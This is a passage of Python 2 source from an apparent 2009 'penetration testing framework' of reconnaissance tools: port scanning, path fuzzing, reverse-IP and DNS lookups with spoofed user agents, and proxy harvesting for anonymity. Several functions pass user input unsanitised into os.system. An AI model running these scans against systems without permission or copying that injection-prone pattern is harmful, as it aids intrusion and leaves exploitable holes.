			os.system(cgiscan)
			sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

def smtenu():

	#/usr/bin/python
	
	ip = 'o'
	log="reverselog.txt"
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t############################################################"
		print "\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE             #" 
		print "\t#    Copyright (C) 2009 By Ashikali                        #"
		print "\t#    SMTP ADDRESS SNIFER                                   #" 
		print "\t#    Ashikali1208[at]yahoo[dot]com                         #"                                
		print "\t#    www.Ashikali.com                                      #" 
		print "\t#    GNU General Public License                            #"
		print "\t############################################################"
		print "\n\tEnter 1 For Contineue "
		print "\n\tEnter 2 For Help Or Detail"
		print "\n\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\tEnter Which Operation You Want To Perform---> ")	
		if cho == '2':
			hlplogin()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			target=raw_input("\n\n\tEnter The Target Here : ")
			print "\n\t[+] Target Loded ",target		
			cgiscan="nslookup -q=MX "+target
			os.system(cgiscan)
			sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

def pathpingu():

	#/usr/bin/python
	
	ip = 'o'
	log="reverselog.txt"
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t############################################################"
		print "\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE             #" 
		print "\t#    Copyright (C) 2009 By Ashikali                        #"
		print "\t#    DISTANCE IDENTIFIER                                   #" 
		print "\t#    Ashikali1208[at]yahoo[dot]com                         #"                                
		print "\t#    www.Ashikali.com                                      #" 
		print "\t#    GNU General Public License                            #"
		print "\t############################################################"
		print "\n\tEnter 1 For Contineue "
		print "\n\tEnter 2 For Help Or Detail"
		print "\n\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\tEnter Which Operation You Want To Perform---> ")	
		if cho == '2':
			hlplogin()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			target=raw_input("\n\n\tEnter The Target Here : ")
			print "\n\t[+] Target Loded ",target		
			cgiscan="pathping "+target
			os.system(cgiscan)
			sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def trce():

	#/usr/bin/python
	
	ip = 'o'
	log="reverselog.txt"
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t############################################################"
		print "\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE             #" 
		print "\t#    Copyright (C) 2009 By Ashikali                        #"
		print "\t#    TARGET DIGGER                                         #" 
		print "\t#    Ashikali1208[at]yahoo[dot]com                         #"                                
		print "\t#    www.Ashikali.com                                      #" 
		print "\t#    GNU General Public License                            #"
		print "\t############################################################"
		print "\n\tEnter 1 For Contineue "
		print "\n\tEnter 2 For Help Or Detail"
		print "\n\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\tEnter Which Operation You Want To Perform---> ")	
		if cho == '2':
			hlplogin()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			target=raw_input("\n\n\tEnter The Target Here : ")
			print "\n\t[+] Target Loded ",target		
			cgiscan="tracert "+target
			os.system(cgiscan)
			sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def whoo():

	import urllib, sys, re

	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t############################################################"
		print "\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE             #" 
		print "\t#    Copyright (C) 2009 By Ashikali                        #"
		print "\t#    WHO IS IDENTIFIER                                     #" 
		print "\t#    Ashikali1208[at]yahoo[dot]com                         #"                                
		print "\t#    www.Ashikali.com                                      #" 
		print "\t#    GNU General Public License                            #"
		print "\t############################################################"
		print "\n\tEnter 1 For Contineue "
		print "\n\tEnter 2 For Help Or Detail"
		print "\n\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\tEnter Which Operation You Want To Perform---> ")	
		if cho == '2':
			hlplogin()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			name = raw_input("\nEnter The Target Here : ")
			url = "http://reports.internic.net/cgi/whois?whois_nic=" +name +"&type=domain"

			site = urllib.urlopen(url).readlines()

			for line in site:
				if re.search("Domain Name:", line):
					print "\n" , line ,"\n"
				if re.search("Registrar:", line):
					print line ,"\n"
				if re.search("Name Server:", line):
					print line , "\n"
				if re.search("Whois Server:", line):
					print line , "\n"
				if re.search("Referral URL:", line):
					print line, "\n"
				if re.search("Status:", line):
					print line, "\n"
				if re.search("Updated Date:", line):
					print line, "\n"
				if re.search("Creation Date:", line):
					print line, "\n"
				if re.search("Expiration Date:", line):
					print line, "\n"
			sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
	

def revrip():

	import sys, urllib2, httplib, os, re, sets, time, socket, sgmllib, threading, pickle, urllib, random

	log = "reviplog.txt"
	ekstensi=".log"
	machine="http://www.ip-adress.com/reverse_ip/"

	class MyParser(sgmllib.SGMLParser): 
		"A simple parser class." 
	 	def parse(self, s): 
			"Parse the given string 's'." 
			self.feed(s) 
			self.close() 
 
		def __init__(self, verbose=0): 
			"Initialise an object, passing 'verbose' to the superclass." 
	 
			sgmllib.SGMLParser.__init__(self, verbose) 
			self.hyperlinks = [] 
 
		def start_a(self, attributes): 
			"Process a hyperlink and its 'attributes'." 
	 
			for name, value in attributes: 
				if name == "href": 
					self.hyperlinks.append(value) 
           
		def get_hyperlinks(self): 
			"Return the list of hyperlinks." 
	 
			return self.hyperlinks 




	def ambil_reverse():
		global threadz
		global jumlah
		global udah
		saring1="whois"
		saring2="http://www.ip-adress.com/"
		saring3="http://www.addthis.com/bookmark.php"
		saring3="http://www.addthis.com/bookmark.php"
	        saring4="http://www.thumbshots.com"
	        saring5="http://www.addthis.com/bookmark.php"
	        saring6="http://www.advancedregistryfix.com"
	        saring7="http://www.proxyfire.net"
	        saring8="http://www.hideyouripaddress.net"
		saring9="http://www.twitter.com/ipadress"
	        saring10="http://www.ip2location.com"
		jumlah=0
		trik=0
		reipl = "ashu.txt"
		threadz=1
		threadzx=str(threadz)
		threadzx=threadzx+ekstensi
		url=machine+target
		print "\tworking..please wait !"
		print "-----------------------------------------"
		try:
		 udah="belum"
		 acax=random.randint(1,25)
	         if(acax==1):  
		  user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
	         elif(acax==2):
	          user_agent = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6'
		 elif(acax==3):
	          user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11'
		 elif(acax==4):
	          user_agent = 'Opera/9.25 (Windows NT 5.1; U; en)'
		 elif(acax==5):
	          user_agent = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12'
		 elif(acax==6):
	          user_agent = 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)'
		 elif(acax==7):
	          user_agent = '*/Nutch-0.9-dev'
		 elif(acax==8):
	          user_agent = 'fly/6.01 libwww/4.0D'
		 elif(acax==9):
	          user_agent = 'FSurf15a 01'
		 elif(acax==10):
	          user_agent = 'amaya/9.51 libwww/5.4.0'
		 elif(acax==11):
	          user_agent = 'AmigaVoyager/3.4.4 (MorphOS/PPC native)'
		 elif(acax==12):
	          user_agent = 'Mozilla/5.0 (compatible; MSIE 5.5; Windows NT)'
		 elif(acax==13):
	          user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)'
		 elif(acax==14):
	          user_agent = 'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )'
		 elif(acax==15):
	          user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;'
		 elif(acax==16):
	          user_agent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; FDM)'
		 elif(acax==17):
	          user_agent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Avant Browser [avantbrowser.com]; Hotbar 4.4.5.0)'
		 elif(acax==18):
	          user_agent = 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.6) Gecko/20070809 Camino/1.5.1'
		 elif(acax==19):
	          user_agent = 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.14) Gecko/20080409 Camino/1.6 (like Firefox/2.0.0.14)'
		 elif(acax==20):
	          user_agent = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040413 Debian/1.6-5'
		 elif(acax==21):
	          user_agent = 'Mozilla/5.0 (Windows; U; Win 9x 4.90) Gecko/20020502 CS 2000 7.0/7.0'
		 elif(acax==22):
	          user_agent = 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2) Gecko/20021126'
		 elif(acax==23):
	          user_agent = 'Mozilla/5.0 (X11; U; Linux 2.4.3-20mdk i586; en-US; rv:0.9.1) Gecko/20010611'
		 elif(acax==24):
	          user_agent = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)'
		 
		 else:
	          user_agent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)'
		  
	  
		 print "\nUsing fake http user agent: "+user_agent
		 headers = { 'User-Agent' : user_agent }
		 values = {'host' : target}
		 data = urllib.urlencode(values)
		 req = urllib2.Request(url, data, headers)
		 response = urllib2.urlopen(req)
	         parser = MyParser()
		 dax=response.read()
		 parser.parse(dax) 
		 links = parser.get_hyperlinks()
		 file = open(reipl, "a")
		 for l in links:
			
	                if saring1 in l and udah<>"ya":
		            if saring2 not in l and saring3 not in l and saring4 not in l and saring5 not in l and saring6 not in l and saring7 not in l and saring8 not in l and saring9 not in l and saring10 not in l: 		
			       if trik>50:	
			         file.close()
				 trik=0
				 threadz=threadz+1
	                         threadzx=str(threadz)
				 threadzx=threadzx+ekstensi
				 file = open(reipl, "a")
		                 l=l.replace('/whois/','http://')
				 if l=="http://":
					 udah="ya"
				 if l<>"http://":
			           print l
				   file.write(l) 
			           file.write("\n")
			           jumlah=jumlah+1
			           trik=trik+1
	        
			       else:
			         
				 l=l.replace('/whois/','http://')
				 if l=="http://":
					 udah="ya"
				 
			         if l<>"http://":
				   print l
				   file.write(l) 
			           file.write("\n")
			           jumlah=jumlah+1
			           trik=trik+1
	         print "----------------------------------------"
	         print "Found :",jumlah," Domains hosted at this IP"
		 kuhukuhu=raw_input("Press Any Key For Come Back ... ")
		except(IOError),msg: 
	          print "Error in connecting site ", url 
	          print msg 
	          sys.exit(1) 


	target = raw_input("Enter The Target Here : ")
	print "Target set :" + target
	print "Trying reverse your target's ip..please wait..."
	filelog = open(log, "a")
	filelog.write ("\n[+]Target set :"+target) 
	filelog.write ("\nTrying reverse your target's ip..please wait...")
	filelog.close()
	ambil_reverse()	
	print "----------------------------------------"
	print "Done Reversing your target's ip"
	filelog = open(log, "a")
	filelog.write ("\n----------------------------------------") 
	filelog.write ("\nDone Reversing your target's ip")
	filelog.close()



def webfing():

	import urllib2, sys, httplib, threading, sets, socket, time, re
	ashu=raw_input("\n\nEnter The Website Here : ")
	global fuzztable
	site = ashu.replace("http://","").split("/",1)[0] 
	timeout = 2
	socket.setdefaulttimeout(timeout)

	threads = []
	numthreads = 8
	extensions = ['php','asp','aspx','cfm','html','htm']
	tmptable = []
	found = []
	final = []
	collected = []
	ldm = 'apr-24-09'
	version = '0.2'
	
	def pContent(url):
	        try:
	                request_web = urllib2.Request(url);agent = 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)'
	                request_web.add_header('User-Agent', agent);opener_web = urllib2.build_opener()
	                text = opener_web.open(request_web).read();strreg = re.compile('(?<=href=")(.*?)(?=")')
	                names = strreg.findall(text);opener_web.close()
	                for name in names:
				if site in name or '=' in name or name.startswith('/'):
					global collected
					collected.append(name)
				elif site in name and EXT in name:
					collected.append(name)
				elif 'http://' in name:
					collected.append(name)
		except:
			pass
	def Fuzz(entry):
		try:
			entry = "/" + entry
			connection = httplib.HTTPConnection(site)
			connection.request("GET",entry)
			response = connection.getresponse()
			if response.status == 200:
				str = 'http://'+site+entry
				print "Found : %s " % (str)
				found.append(str)
			else:
				pass
		except(KeyboardInterrupt,SystemExit):
				raise
		except:
				pass	

	cnt = 1

	for val in extensions: print cnt,":", val;cnt += 1
	EXTnr = raw_input('\nChoose website File Extension [1-5] : ')
	EXT = extensions[int(EXTnr)-1]

	for entry in fuzztable:
		tmptable.append(entry+'.'+EXT)
	print "\n[+] Fuzzing for ."+EXT+" Files....\n"
	for entry in tmptable: Fuzz(entry)
	for entry in found: pContent(entry)	
	
	for entry in collected:
		if entry.startswith('/') and EXT in entry and '=' in entry:
			final.append('http://'+site+entry)
		elif entry.startswith('http://') and site in entry and EXT in entry:
			final.append(entry)
		else:
			pass

	if len(final) > 2:
		final.sort();lastEntry = final[-1]
		for e in range(len(final)-2, -1, -1):
			try:
		        	LE = lastEntry.split('?')
		                fURLS = final[e].split('?')
				if LE[0] == fURLS[0]:
		        		del final[e]
			        else:
		        		lastEntry = final[e]
		        except(IndexError):
				pass

	print "\n>> Found :", len(final), "Strings\n"
	for entry in final:
		print entry


def oppor():

	#!/usr/bin/python

	import socket as sk
	import sys
	import threading

	MAX_THREADS = 50
	ashu=raw_input("\n\tEnter The Target Website Here : ")
	sal=input("\n\tEnter The Starting Port Here : ")
	bal=input("\n\tEnter The Ending Port Here : ")
	print "\n\n\t[+] Port Scanning Is Started"
	class Scanner(threading.Thread):
	    def __init__(self, host, port):
	        threading.Thread.__init__(self)
	        # host and port
	        self.host = host
	        self.port = port
	        # build up the socket obj
	        self.sd = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
	
	    def run(self):
	        try:
	            # connect to the given host:port
	            self.sd.connect((self.host, self.port))	
	            print "\n\thttp://%s:%d OPEN" % (self.host, self.port)
        	    self.sd.close()
	        except: pass

	class pyScan:
	    def __init__(self, args=[]):
	        self.args = args
	        self.start, self.stop = 1, 1024
	        self.host = ""
		self.start = int(sal)
	        self.stop = int(bal)
	        self.host = ashu
	        try:
	            sk.gethostbyname(self.host)
	        except:
	            print "hostname '%s' unknown" % self.host
	        self.scan(self.host, self.start, self.stop)

	    def scan(self, host, start, stop):
	        self.port = start
	        while self.port <= stop:
	            while threading.activeCount() < MAX_THREADS:
	                Scanner(host, self.port).start()
	                self.port += 1
	        
	if __name__ == "__main__":
	    pyScan(sys.argv)
	sending_back_to_Vilage=raw_input("")	


def proxch1():

	#!/usr/bin/python

	import sys, os, urllib, urllib2, re, httplib, sets, socket
	from time import time, localtime, strftime
	from socket import gethostbyaddr

	nogeoip = 0
	try:
		import GeoIP
	except:
		nogeoip = 1
		print "\nGeoIP Module/Database NOT found, try:"
		print "sudo apt-get install libgeoip1 && sudo apt-get install python-geoip"
		print "or visit www[.]maxmind[.]com for download"
		print "GeoIP is not required but highly recommended!\n"
	print "\n\nPlease Be Relex Tool Is Started To Perform Ckeck Proxylist.txt Aftrer Complete \n\n"
	output = 'proxylist.txt'
	sleeptimer = 3
	socket.setdefaulttimeout(10)
	alivelist = []
	myipadress = urllib.urlopen('http://www.whatismyip.com/automation/n09230945.asp').read()
	anon_list = []
	trans_list = []
	planetlab = []

	sites = ['http://www.1proxyfree.com/', 
		 'http://www.atomintersoft.com/products/alive-proxy/socks5-list/',
		 'http://www.proxylist.net/',
		 'http://www.proxylists.net/http_highanon.txt']

	def StripTags(text):
		return re.sub(r'<[^>]*?>','', text)

	def timer():
		now = strftime('%H:%M:%S-%d/%b/%Y', localtime())
		return now

	def ipcheck(proxy):
		try:
			pxhandle = urllib2.ProxyHandler({"http": proxy})
			opener = urllib2.build_opener(pxhandle)
			urllib2.install_opener(opener)
			myip = urllib2.urlopen('http://www.whatismyip.com/automation/n09230945.asp').read()
			xs =  re.findall(('\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}'), StripTags(myip))
			if xs[0] == myipadress or myipadress == myip:
				trans_list.append(proxy)
				print proxy[:-1],"\t- ALIVE -", timer(), "- TRANSPARENT"
			elif xs == None:
				pass
			else:
				anon_list.append(proxy)
				print proxy[:-1],"\t- ALIVE -", timer(), "- EXT-iP :",xs[0]
		except KeyboardInterrupt:
			print "\n\nCTRL+C - check temporary proxylist file\n\n"
			sys.exit(0)
		except:
			pass

	def proxyvalidator(proxylist):
	        finalcount = 0
		for proxy in proxylist:
			proxy.replace('\n', '')
			try:
				proxies = {'http': "http://"+proxy[:-1]}
				opener = urllib.FancyURLopener(proxies)
				try:
					loopchk = opener.open("http://www.google.com").read()
				except:
					pass
			except(IOError,socket.timeout), detail: 
				pass
			ipcheck(proxy)		
			alivelist.append(proxy)
			finalcount += 1
		return alivelist

	def getsamairdotru():
		counter = 1
		pxycnt = 0
		maxpages = 10
		urls = []
		pfile = file(output, 'a')
		while counter <= maxpages:
			if counter < 10: # workaround for page-01 to page-09
				opener = urllib2.build_opener()
				opener.addheaders = [('User-agent', 'Mozilla/5.0')]
				url = opener.open('http://www.samair.ru/proxy/proxy-0'+repr(counter)+'.htm').read()
			else:
				opener = urllib2.build_opener()
				opener.addheaders = [('User-agent', 'Mozilla/5.0')]
				url = opener.open('http://www.samair.ru/proxy/proxy-'+repr(counter)+'.htm').read()
			strings = re.findall(('\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}:\d{1,5}'), StripTags(url))
			for string in strings:
				pfile.write(string+"\n")
				pxycnt = pxycnt+1
			counter = counter+1		
			opener.close()
		print pxycnt, "\t: Proxies received from : http://www.samair.ru/proxy/"
		pfile.close()

	def getsinglesitelist(site):
	        pxycnt = 0
	        urls = []
	        pfile = file(output, 'a')
	        opener = urllib2.build_opener()
	        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
	        url = opener.open(site).read()
	        strings = re.findall(('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}[:]\d{1,5}'), StripTags(url))
	        for string in strings:
			pfile.write(string+"\n")
	                pxycnt = pxycnt+1
		print pxycnt, "\t: Proxies recieved from :", site.split("//",3)[1]
	        opener.close()
	        pfile.close()

	def getplanetlabs():
		opener = urllib2.build_opener()
	        url = opener.open('http://fall.cs.princeton.edu/codeen/tabulator.cgi?table=table_all').read()
		strings = re.findall(('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}'), StripTags(url))
		for string in strings:
			planetlab.append(string)
		print len(planetlab), "\t: PlanetLab Proxylist Loaded", "\n"

	def cleanup():
		pfile = open(output, 'r').readlines()
		outfile = file(output, 'w')
		sorted = []
		finalcount = 0
		psremove = 0
		for proxy in pfile:
			if proxy.split(':',1)[0] not in planetlab:
				if proxy not in sorted:
					sorted.append(proxy)
					outfile.write(proxy)
					finalcount += 1
			if proxy.split(':',1)[0] in planetlab:
				psremove += 1
		print "\n", psremove, "\t: PlanetLab (CoDeen) Proxies removed!"
		print finalcount,"\t: unique Proxies found\n"
		print "[+]Testing Proxy"
		outfile.close()

	def fileConst():
		fileC = open(output, 'w')
		falive = []
		fileC.write('+ This List has been generated with proxyharvest_1.1.py // www.darkc0de.com\n')
		fileC.write('+ ANONYMOUS PROXIES\n\n')
		for anon in anon_list:
			fileC.write(anon)
			if anon in alivelist:
				alivelist.remove(anon)
	        fileC.write('\n\n+ TRANSPARENT PROXIES\n\n')
	        for trans in trans_list:
	                fileC.write(trans)
			if trans in alivelist:
				alivelist.remove(trans)
		fileC.write('\n\n+ WORKING BUT UNCLEAR PROXIES\n\n')
		alivelist.sort()
		for alive in alivelist:
			fileC.write(alive)
		fileC.close()	


	print "IP:", myipadress, "//", timer(), "\n"
	getplanetlabs()
	
	for site in sites:
		try:
			getsinglesitelist(site)
		except:
			print "Error   :", site
	
	proxylist = open(output, 'r').readlines()
	proxyvalidator(proxylist)
	
	
def proxtes():
	
	import sys, urllib, socket
	socket.setdefaulttimeout(5) #Set your socket timeout here.
	
	def main(proxy):
		
		try:# make a http HEAD request
			proxies = {'http': "http://"+proxy[:-1]}
			opener = urllib.FancyURLopener(proxies)
			opener.open("http://www.python.org")
			print "\t[+] Alive"
		except(IOError), msg: 
			print "\t[-] Dead"
				
			pass


	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  PROXY TESTER                              #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS') 
			ashud=raw_input("\n\t\tEnter The File Name Here : ")
			verbose = 1
	
			try:
				lines = open(ashud, "r").readlines()
				print "\n[+] Proxies loaded:",len(lines)
				try:
					if verbose == 1:
						print "[+] Verbose Mode On\n"
				except(NameError):
					print "[-] Verbose Mode Off\n"
					verbose = 0
					pass
			except(IOError): 
 				print "Error: Check your file path.\n" 
				sys.exit(1)
	
			for proxy in lines:
				print "[+] Testing:",proxy[:-1]
				main(proxy)
			print "\n[-] Done\n"
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def webeye():

	import httplib, socket, time, re, os, sys, datetime 
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  WEB SERVER SPIDER                         #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS') 
			url = raw_input("\n\tEnter the URL you want to Monitor: ") 
			http = "http://" 
 
			if http in url: 
				print 
				print "ERROR! Remove http:// from the URL." 
				
 
			count = 0 
 
			while 1: 
  
				count = count + 1 
 	
				getdate = datetime.datetime.today() 
				today = getdate.strftime("%d/%m/%Y %H:%M:%S") 
 
			
				socket.setdefaulttimeout(15) 
 
				 
				conn = httplib.HTTPConnection(url, 80) 
 
				try: conn.request("HEAD", "/") 
				except socket.timeout: 
					print "Webserver has timed out. Check URL and internet connection." 
 
				
				res = conn.getresponse() 
		 
				
				conn.close() 
 
				
				ip = socket.gethostbyname(url) 
				server = res.getheader('Server') 
				xpoweredby = res.getheader('x-powered-by') 
				date = res.getheader('date') 
	 
				print "\n\tWeb Monitoring Is Started"
 				print "\n"
				if xpoweredby == None: 
					print ip + " " + server + " " + date 
				else: 
					print ip + " " + server + " " + xpoweredby + " " + date 
 
				print 
				print "The script has run", count, "time/s." 
 
				if (count < 2): 
 
					
					outfile = file('log.txt', 'w') 
					outfile.write("Started on " + today + "\n") 
					outfile.write(ip + " ") 
					outfile.write(server + " ") 
 
					if xpoweredby != None: 
						outfile.write(xpoweredby + " ") 
						outfile.write(date + "\n") 
						outfile.close() 
					else: 
						outfile.write(date + "\n") 
						outfile.close() 
 
				
					print 
					print "Logged!" 
					print 
				else: 
 
					
					readfile = open('log.txt', "r") 
					text = readfile.read() 
 
					if ip not in text: 
						outfile = file('log.txt', 'a') 
						outfile.write('IP address has been changed! New IP is ' + ip + ' ' + date + '\n') 
						outfile.close() 
 
					if server not in text: 
						outfile = file('log.txt', 'a') 
						outfile.write('Web Server software has been changed! New server is ' + server + ' ' + date + '\n') 
						outfile.close() 
 
					if xpoweredby != None and xpoweredby not in text: 
						outfile = file('log.txt', 'a') 
						outfile.write('X-powered-by header has been changed! New header is ' + xpoweredby + ' ' + date + '\n') 
						outfile.close() 
 	
				try: time.sleep(3600) 
				except KeyboardInterrupt: 
						outfile = file('log.txt', 'a') 
						outfile.write("Finished on " + today) 
						outfile.close() 
						print 
						print "Check log.txt." 
						print 
						sys.exit() 
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def subserch():

	import sys, socket

	def getips(ip_range):
		
		lst = []
		iplist = []
		ip_range = ip_range.rsplit(".",2)
		if len(ip_range[1].split("-",1)) ==2:
			for i in range(int(ip_range[1].split("-",1)[0]),int(ip_range[1].split("-",1)[1])+1,1):
				lst.append(ip_range[0]+"."+str(i)+".")
			for ip in lst:
				for i in range(int(ip_range[2].split("-",1)[0]),int(ip_range[2].split("-",1)[1])+1,1):
					iplist.append(ip+str(i))
			return iplist
		if len(ip_range[1].split("-",1)) ==1:
			for i in range(int(ip_range[2].split("-",1)[0]),int(ip_range[2].split("-",1)[1])+1,1):
				iplist.append(ip_range[0]+"."+str(ip_range[1].split("-",1)[0])+"."+str(i))
			return iplist
			
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  WEB SERVER HOSTNAME IDENTYFIER            #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			ashu=raw_input("\n\tEnter The IP Range Here : ")	
			iplist = getips(ashu)
			print "\n[+] Range Loaded:",len(iplist),"\n"
			num = 0
			for ip in iplist:
				try:
					hn = socket.gethostbyaddr(ip)[0]
					print "HostIP:",ip
					print "HostName:",hn
					num +=1
				except(socket.herror):
					pass
			print "\n[+] Found",num,"possible subdomain(s) for ip range",ashu,"\n"
